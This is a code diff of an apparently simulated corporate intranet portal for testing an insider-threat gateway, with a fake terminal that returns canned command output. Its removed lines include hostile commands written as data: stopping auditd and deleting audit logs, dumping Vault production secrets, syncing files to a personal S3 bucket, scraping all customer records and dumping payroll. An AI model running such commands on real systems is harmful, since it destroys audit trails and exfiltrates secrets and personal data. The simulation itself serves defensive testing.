+                    <span class="cli-prompt terminal-font" id="cli-prompt">sarah@nexus:~$</span>
+                    <input type="text" id="cli-cmd" class="cli-input" placeholder="e.g. cat /models/nexus-foundation-70b/config.json or git status" onkeydown="if(event.key==='Enter') executeCommand();">
+                    <button class="btn-run" onclick="executeCommand()">Run Task</button>
+                </div>
+            </div>
+        </div>
     </main>
+
     <footer>
-        &copy; 2026 Nexus Cloud Technologies Inc. | Corporate Intranet & Development Portal (:8090)
+        &copy; 2026 Nexus Cloud Technologies Inc. &bull; Internal Enterprise Architecture Portal (:8090)
     </footer>
 
     <script>
-        // Company Profile injected from backend
-        const COMPANY_PROFILE = """ + json.dumps(COMPANY_PROFILE) + """;
+        const CORE_EMPLOYEES = """ + json.dumps(CORE_EMPLOYEES) + """;
+        let activeUid = "usr_dev_01";
 
-        let currentPersona = "usr_dev_01";
-
-        function initDropdown() {
-            const select = document.getElementById("employee-dropdown");
+        function initSelector() {
+            const select = document.getElementById("persona-selector");
             select.innerHTML = "";
-            (COMPANY_PROFILE.employees || []).forEach(emp => {
+            CORE_EMPLOYEES.forEach(emp => {
                 const opt = document.createElement("option");
                 opt.value = emp.user_id;
-                opt.innerText = `${emp.name} (${emp.role})`;
+                opt.innerText = `${emp.name} — ${emp.role} (${emp.department})`;
                 select.appendChild(opt);
             });
-            select.value = currentPersona;
-        }
-
-        function onDropdownSelect(uid) {
-            switchPersona(uid);
+            select.value = activeUid;
         }
 
         function switchPersona(uid) {
-            currentPersona = uid;
-            const emp = (COMPANY_PROFILE.employees || []).find(e => e.user_id === uid);
+            activeUid = uid;
+            document.cookie = `nexus_session=${uid}; path=/; max-age=86400; SameSite=Lax`;
+            const emp = CORE_EMPLOYEES.find(e => e.user_id === uid);
             if (!emp) return;
 
-            document.getElementById("employee-dropdown").value = uid;
-
-            // Highlight Pill if exists
-            document.querySelectorAll(".btn-persona").forEach(p => p.classList.remove("active"));
-            const pill = document.getElementById(`pill-${uid}`);
-            if (pill) pill.classList.add("active");
-
-            // Update Metadata Strip
-            document.getElementById("disp-uid").innerText = emp.user_id;
+            document.getElementById("persona-selector").value = uid;
+            document.getElementById("disp-name").innerText = emp.name;
             document.getElementById("disp-role").innerText = emp.role;
             document.getElementById("disp-dept").innerText = emp.department;
-            document.getElementById("disp-device").innerText = emp.assigned_device;
+            document.getElementById("disp-ip").innerText = `IP: ${emp.assigned_ip}`;
+            document.getElementById("user-dept-tag").innerText = `Active Role: ${emp.role}`;
 
-            // Check SSH policy
-            const allowedSSH = (COMPANY_PROFILE.ssh_policy?.allowed_roles || []).includes(emp.department);
-            const sshElem = document.getElementById("disp-ssh");
-            if (allowedSSH) {
-                sshElem.innerText = "AUTHORIZED";
-                sshElem.style.color = "#16a34a";
-            } else {
-                sshElem.innerText = "BLOCKED / HONEYPOT";
-                sshElem.style.color = "#dc2626";
-            }
+            const initials = emp.name.split(" ").map(p => p[0]).join("").slice(0, 2);
+            document.getElementById("user-avatar").innerText = initials;
 
-            renderDepartmentTools(emp.department);
+            const handle = emp.name.toLowerCase().split(" ")[0];
+            document.getElementById("cli-prompt").innerText = `${handle}@nexus:~$`;
+            document.getElementById("terminal-session-label").innerText = `nexus-sh • ${handle}@${emp.assigned_ip}`;
+
+            renderQuickTasks(emp.department);
+            logToTerminal(`[SYSTEM] Switched active session context to ${emp.name} (${emp.user_id}).`);
         }
 
-        function renderDepartmentTools(dept) {
-            const header = document.getElementById("dept-tool-header");
-            const container = document.getElementById("dept-tool-content");
+        function renderQuickTasks(dept) {
+            const container = document.getElementById("quick-tasks-container");
+            let tasks = [];
 
             if (dept === "AI_Platform") {
-                header.innerText = "AI & Foundation Model Tools (Dr. Sarah Chen's Workspace)";
-                container.innerHTML = `
-                    <div class="tool-card">
-                        <h4>
-                            <span>Export Model Checkpoint & Embeddings</span>
-                            <span class="tag-scope" style="background: #ede9fe; color: #6d28d9;">Standard AI Task</span>
-                        </h4>
-                        <p>Compress and stage latest foundation model checkpoint for internal evaluation.</p>
-                        <div class="form-row">
-                            <input type="text" id="ai-model-target" value="/models/nexus-foundation-70b/weights.safetensors">
-                            <button class="btn-action" onclick="triggerAction('model_export', document.getElementById('ai-model-target').value)">
-                                Export Weights
-                            </button>
-                        </div>
-                    </div>
-                `;
+                tasks = [
+                    { label: "Inspect 70B Model Config", cmd: "cat /models/nexus-foundation-70b/config.json" },
+                    { label: "Check Weights Manifest", cmd: "cat /models/nexus-foundation-70b/weights_manifest.json" },
+                    { label: "View Evaluation Benchmarks", cmd: "cat /experiments/eval_benchmarks_run42.json" },
+                    { label: "Git Repository Status", cmd: "git status" }
+                ];
             } else if (dept === "Cloud_DevOps") {
-                header.innerText = "Cloud Infrastructure & SRE Tools (Marcus Vance's Workspace)";
-                container.innerHTML = `
-                    <div class="tool-card">
-                        <h4>
-                            <span>HashiCorp Vault Secret Dump (Privileged Harvest)</span>
-                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">High-Risk Admin Probe</span>
-                        </h4>
-                        <p>Query raw production database keys and master service tokens from Vault.</p>
-                        <div class="form-row">
-                            <input type="text" id="vault-key" value="/vault/prod/db_credentials.enc">
-                            <button class="btn-action btn-danger" onclick="triggerAction('vault_dump', document.getElementById('vault-key').value)">
-                                Dump Production Vault Secrets
-                            </button>
-                        </div>
-                    </div>
-                    <div class="tool-card" style="margin-top: 1rem;">
-                        <h4>
-                            <span>Anti-Forensics: Audit Logging Daemon Toggle</span>
-                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">Cover-Up Indicator</span>
-                        </h4>
-                        <p>Disable Datadog agent and terminate auditd daemon to blind security sensors.</p>
-                        <div class="form-row">
-                            <button class="btn-action btn-danger" onclick="triggerAction('disable_auditd', 'systemctl stop auditd && rm -rf /var/log/audit.log')">
-                                Terminate Audit Logging & Purge Logs
-                            </button>
-                        </div>
-                    </div>
-                `;
+                tasks = [
+                    { label: "Review Terraform State", cmd: "cat /infrastructure/terraform.tfstate" },
+                    { label: "Inspect K8s GPU Nodes", cmd: "cat /kubernetes/k8s_cluster_nodes.json" },
+                    { label: "Kubectl Pod Health", cmd: "kubectl get pods -n production" },
+                    { label: "Check Systemctl Daemon", cmd: "systemctl status auditd" }
+                ];
             } else if (dept === "Customer_Success") {
-                header.innerText = "Customer Support & Tenant Management (Carol Rodriguez's Workspace)";
-                container.innerHTML = `
-                    <div class="tool-card">
-                        <h4>
-                            <span>Cross-Tenant Customer PII Database Dump</span>
-                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">Data Trafficking Violation</span>
-                        </h4>
-                        <p>Scrape customer billing details, phone numbers, and payment tokens across all customer tenants.</p>
-                        <div class="form-row">
-                            <button class="btn-action btn-danger" onclick="triggerAction('tenant_scrape', '/admin/tenants/export_all_customers.json')">
-                                Scrape All Customer Records
-                            </button>
-                        </div>
-                    </div>
-                `;
+                tasks = [
+                    { label: "View Support Ticket Queue", cmd: "cat /support/tickets/enterprise_tickets_q3.json" },
+                    { label: "Query Support API", cmd: "curl -s http://internal.nexuscloud/api/tickets" },
+                    { label: "Check Documentation Index", cmd: "ls -la /support/docs" }
+                ];
             } else if (dept === "Finance_HR") {
-                header.innerText = "Finance & People Operations Tools (Bob Jones / David Sterling's Workspace)";
-                container.innerHTML = `
-                    <div class="tool-card">
-                        <h4>
-                            <span>Payroll & Executive Equity Ledger Export</span>
-                            <span class="tag-scope" style="background: #fee2e2; color: #b91c1c;">Pre-Resignation Theft</span>
-                        </h4>
-                        <p>Download unredacted employee compensation, social security numbers, and bank routing details.</p>
-                        <div class="form-row">
-                            <button class="btn-action btn-danger" onclick="triggerAction('export_payroll', '/hr/payroll_executive_2026.csv')">
-                                Download Executive Payroll
-                            </button>
-                        </div>
-                    </div>
-                `;
+                tasks = [
+                    { label: "Inspect Company Directory", cmd: "cat /hr/employees_2026.csv" },
+                    { label: "Audit Q3 Invoices Ledger", cmd: "cat /finance/q3_invoices.xlsx" },
+                    { label: "Review Department Roster", cmd: "ls -la /finance" }
+                ];
             } else {
-                header.innerText = "General Corporate Employee Workspace";
-                container.innerHTML = `
-                    <p style="color: var(--text-muted); font-size: 0.85rem;">Standard office tools and documentation view.</p>
-                `;
+                tasks = [
+                    { label: "Inspect Home Directory", cmd: "ls -la /home" },
+                    { label: "Check Network Routing", cmd: "ip route" }
+                ];
             }
+
+            container.innerHTML = "";
+            tasks.forEach(t => {
+                const btn = document.createElement("button");
+                btn.className = "chip-btn";
+                btn.innerText = t.label;
+                btn.onclick = () => {
+                    document.getElementById("cli-cmd").value = t.cmd;
+                    executeCommand();
+                };
+                container.appendChild(btn);
+            });
         }
 
-        async function triggerAction(actionType, targetValue) {
-            const emp = (COMPANY_PROFILE.employees || []).find(e => e.user_id === currentPersona);
-            const resDiv = document.getElementById("action-result");
-            const resBody = document.getElementById("result-body");
-            const resTitle = document.getElementById("result-title");
-            const resTag = document.getElementById("result-status-tag");
+        function selectResource(path) {
+            document.querySelectorAll(".file-entry").forEach(e => e.classList.remove("active-file"));
+            event.currentTarget.classList.add("active-file");
+            document.getElementById("cli-cmd").value = `cat ${path}`;
+            executeCommand();
+        }
 
-            resDiv.style.display = "block";
-            resDiv.className = "result-box";
-            resTitle.innerText = "Evaluating Telemetry against AdaptiveShield Gateway...";
-            resTag.innerText = "INSPECTING";
-            resBody.innerText = `[CLIENT TELEMETRY SIGNAL SENT]
-User: ${emp.name} (${emp.user_id})
-Department: ${emp.department} | Assigned IP: ${emp.assigned_ip}
-Action: ${actionType}
-Target: ${targetValue}
-Timestamp: ${new Date().toISOString()}`;
+        function logToTerminal(text) {
+            const out = document.getElementById("terminal-output");
+            out.innerText += "\\n" + text;
+            out.scrollTop = out.scrollHeight;
+        }
 
-            let command = "";
+        async function executeCommand() {
+            const input = document.getElementById("cli-cmd");
+            const cmd = input.value.trim();
+            if (!cmd) return;
+
+            const emp = CORE_EMPLOYEES.find(e => e.user_id === activeUid);
+            const prompt = document.getElementById("cli-prompt").innerText;
+            logToTerminal(`${prompt} ${cmd}`);
+
+            // Determine file_path if it's a cat command
             let filePath = "";
             let isCloudUpload = false;
+            let actionType = "command_exec";
 
-            if (actionType === 'read_file') {
-                command = `cat ${targetValue}`;
-                filePath = targetValue;
-            } else if (actionType === 'cloud_sync') {
-                command = `aws s3 sync ${targetValue} s3://personal-drop-bucket/ --region us-east-1`;
-                filePath = targetValue;
+            if (cmd.startsWith("cat ")) {
+                filePath = cmd.slice(4).trim();
+                actionType = "read_file";
+            } else if (cmd.includes("s3 sync") || cmd.includes("upload")) {
                 isCloudUpload = true;
-            } else if (actionType === 'model_export') {
-                command = `tar -czf /tmp/model_checkpoint.tar.gz ${targetValue}`;
-                filePath = targetValue;
-            } else if (actionType === 'vault_dump') {
-                command = `vault kv get -format=json secret/production/database > ${targetValue}`;
-                filePath = targetValue;
-            } else if (actionType === 'disable_auditd') {
-                command = targetValue;
-            } else if (actionType === 'tenant_scrape') {
-                command = `curl -H "Auth: Bearer token" https://api.nexuscloud.internal/v1/customers/export_all > ${targetValue}`;
-                filePath = targetValue;
-            } else if (actionType === 'export_payroll') {
-                command = `pg_dump -t payroll_ledger nexus_corp_db > ${targetValue}`;
-                filePath = targetValue;
+                actionType = "cloud_sync";
+                filePath = cmd.split(" ")[2] || "";
             }
 
             try {
@@ -466,11 +493,12 @@ Timestamp: ${new Date().toISOString()}`;
                     headers: {
                         'Content-Type': 'application/json',
                         'x-user-id': emp.user_id,
-                        'x-user-role': emp.department
+                        'x-user-role': emp.role,
+                        'x-user-department': emp.department
                     },
                     body: JSON.stringify({
                         action: actionType,
-                        command: command,
+                        command: cmd,
                         file_path: filePath,
                         cloud_upload: isCloudUpload,
                         source_ip: emp.assigned_ip,
@@ -479,32 +507,28 @@ Timestamp: ${new Date().toISOString()}`;
                 });
 
                 if (response.status === 403) {
-                    resDiv.className = "result-box error";
-                    resTitle.innerText = "🚨 ADAPTIVESHIELD GUARD: Insider Threat Anomaly Detected!";
-                    resTag.innerText = "ACTION BLOCKED";
-                    resBody.innerText += `\n\n[GUARD VERDICT: 403 FORBIDDEN - POLICY VIOLATION]
-Reason: Anomaly score exceeded threshold. Scope violation or exfiltration attempt detected.
-Session marked for security analyst review.`;
+                    logToTerminal(`[SECURITY GATEWAY 403 FORBIDDEN] Access to '${filePath || cmd}' denied by policy.`);
                     return;
                 }
 
                 const data = await response.json();
-                resDiv.className = "result-box success";
-                resTitle.innerText = "✅ ADAPTIVESHIELD GUARD: Activity Approved";
-                resTag.innerText = "AUTHORIZED";
-                resBody.innerText += `\n\n[GUARD VERDICT: 200 OK - BEHAVIOR NORMAL]
-Backend Response: ${data.message || 'Operation executed within allowed scope.'}`;
+                if (data.output) {
+                    logToTerminal(data.output);
+                } else if (data.message) {
+                    logToTerminal(data.message);
+                } else {
+                    logToTerminal(JSON.stringify(data, null, 2));
+                }
             } catch(e) {
-                resDiv.className = "result-box error";
-                resTitle.innerText = "Network Gateway Interruption";
-                resBody.innerText += `\n\nConnection dropped by security interceptor proxy.`;
+                logToTerminal(`[NETWORK ERROR] Could not reach endpoint: ${e.message}`);
             }
         }
 
-        // Initialize on load
         window.addEventListener("DOMContentLoaded", () => {
-            initDropdown();
-            switchPersona("usr_dev_01");
+            initSelector();
+            const match = document.cookie.match(/(?:^|;\\s*)nexus_session=([^;]+)/);
+            const savedPersona = match ? match[1] : "usr_dev_01";
+            switchPersona(savedPersona);
         });
     </script>
 </body>
@@ -514,18 +538,43 @@ Backend Response: ${data.message || 'Operation executed within allowed scope.'}`
 @app.get("/", response_class=HTMLResponse)
 @app.get("/workspace", response_class=HTMLResponse)
 async def internal_workspace():
-    return HTML_INT_HEAD
+    return HTML_WORKSPACE
 
 @app.post("/workspace/api/action")
-@app.post("/{path:path}")
-async def internal_action_handler(path: str, request: Request):
+@app.post("/api/action")
+async def internal_action_handler(request: Request):
     try:
         body = await request.json()
     except Exception:
         body = {}
+
+    cmd = body.get("command", "")
+    file_path = body.get("file_path", "")
+
+    # If reading a file, return the realistic corporate file content
+    output = ""
+    if file_path and file_path in CORPORATE_FILES:
+        output = CORPORATE_FILES[file_path]
+    elif cmd.startswith("cat "):
+        p = cmd[4:].strip()
+        output = CORPORATE_FILES.get(p, f"cat: {p}: No such file or directory")
+    elif cmd == "git status":
+        output = "On branch main\nYour branch is up to date with 'origin/main'.\nnothing to commit, working tree clean"
+    elif "kubectl get pods" in cmd:
+        output = "NAME                                    READY   STATUS    RESTARTS   AGE\nnexus-gateway-7b9f8d67c4-2k9lx           1/1     Running   0          4d12h\ninference-worker-h100-84849ff7-p9qwx     1/1     Running   0          18h\ninference-worker-h100-84849ff7-t4k21     1/1     Running   0          18h\ntelemetry-collector-daemon-5421x        1/1     Running   0          9d"
+    elif "systemctl status" in cmd:
+        output = "● auditd.service - Security Audit Daemon\n   Loaded: loaded (/lib/systemd/system/auditd.service; enabled)\n   Active: active (running) since Wed 2026-10-21 08:00:00 UTC\n   Main PID: 742 (auditd)\n   Tasks: 4 (limit: 4915)\n   Memory: 18.4M"
+    elif "ip route" in cmd:
+        output = "default via 10.10.0.1 dev eth0 proto dhcp src 10.10.4.52 metric 100\n10.10.0.0/16 dev eth0 proto kernel scope link src 10.10.4.52"
+    elif "ls -la" in cmd:
+        output = "total 28\ndrwxr-xr-x 4 nexus staff 4096 Oct 21 08:00 .\ndrwxr-xr-x 8 nexus staff 4096 Oct 18 14:00 ..\n-rw-r--r-- 1 nexus staff 1204 Oct 21 08:30 README.md\n-rw-r--r-- 1 nexus staff 3412 Oct 20 12:15 package.json\ndrwxr-xr-x 2 nexus staff 4096 Oct 21 09:00 src"
+    else:
+        output = f"[nexus-task-runner] Command executed successfully: {cmd}"
+
     return JSONResponse(content={
         "status": "success",
-        "message": f"Action on /{path} processed normally by internal service.",
+        "command": cmd,
+        "output": output,
         "payload": body
     })
 
